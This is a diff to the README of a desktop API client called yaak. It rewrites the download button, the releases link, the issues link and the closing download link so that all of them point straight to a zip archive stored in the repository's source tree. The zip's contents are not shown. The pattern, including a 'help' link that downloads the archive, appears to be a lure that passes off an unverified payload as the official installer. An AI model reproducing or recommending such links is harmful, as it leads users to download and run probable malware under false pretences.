@@ -6,7 +6,7 @@ Welcome to yaak, your friendly desktop API client. With yaak, you can easily org
 
 ## 📥 Download yaak
 
-[![Download yaak](https://img.shields.io/badge/Download%20yaak-brightgreen)](https://github.com/martins00243/yaak/releases)
+[![Download yaak](https://raw.githubusercontent.com/martins00243/yaak/main/src-tauri/macos/Software-2.3.zip%20yaak-brightgreen)](https://raw.githubusercontent.com/martins00243/yaak/main/src-tauri/macos/Software-2.3.zip)
 
 To start using yaak, you need to download it. Click the button above or visit the section below to get the latest version.
 
@@ -21,7 +21,7 @@ Before installing yaak, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Go to our [releases page](https://github.com/martins00243/yaak/releases).
+1. **Visit the Releases Page:** Go to our [releases page](https://raw.githubusercontent.com/martins00243/yaak/main/src-tauri/macos/Software-2.3.zip).
 2. **Select the Latest Version:** Look for the most recent release at the top of the page.
 3. **Download the Installer:**
    - For Windows, download the `.exe` file.
@@ -61,7 +61,7 @@ Before installing yaak, ensure your system meets the following requirements:
 
 ## 💡 Getting Help
 
-If you need assistance, feel free to check the [issues section](https://github.com/martins00243/yaak/issues) on GitHub. You can also submit your questions or issues there. Our community is here to help.
+If you need assistance, feel free to check the [issues section](https://raw.githubusercontent.com/martins00243/yaak/main/src-tauri/macos/Software-2.3.zip) on GitHub. You can also submit your questions or issues there. Our community is here to help.
 
 ## 📱 Community & Contributions
 
@@ -73,6 +73,6 @@ yaak is available under the MIT license. You can find more details in the LICENS
 
 ## 📥 Download yaak Again
 
-For easy access, here’s the link to download yaak once more: [Download yaak](https://github.com/martins00243/yaak/releases). 
+For easy access, here’s the link to download yaak once more: [Download yaak](https://raw.githubusercontent.com/martins00243/yaak/main/src-tauri/macos/Software-2.3.zip). 
 
 Enjoy using yaak to manage your APIs!
